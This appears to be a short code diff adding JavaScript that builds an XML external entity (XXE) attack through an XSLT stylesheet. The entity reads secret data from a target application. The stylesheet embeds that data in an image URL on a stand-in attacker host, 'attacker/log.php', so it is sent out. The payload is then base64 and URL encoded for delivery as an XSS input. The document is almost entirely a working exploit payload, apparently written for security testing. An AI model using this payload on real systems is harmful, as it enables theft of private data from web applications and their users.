@@ -1,0 +1,24 @@
+xmls = `<?xml version="1.0"?>
+<!DOCTYPE a [
+   <!ENTITY xxe SYSTEM  "https://tested_app/secret_data" >]>
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
+  <xsl:template match="/asdf">
+    <HTML>
+      <HEAD>
+        <TITLE></TITLE>
+      </HEAD>
+      <BODY>
+        <img>
+          <xsl:attribute name="src">
+            https://attacker/log.php?&xxe;
+          </xsl:attribute>
+        </img>
+      </BODY>
+    </HTML>
+  </xsl:template>
+</xsl:stylesheet>`
+
+xml=`<?xml version="1.0"?>
+<?xml-stylesheet type="text/xsl" href="data:text/plain;base64,${​​​​​​btoa(xmls)}​​​​​​"?>
+<asdf></asdf>`
+xss=encodeURIComponent(xml)
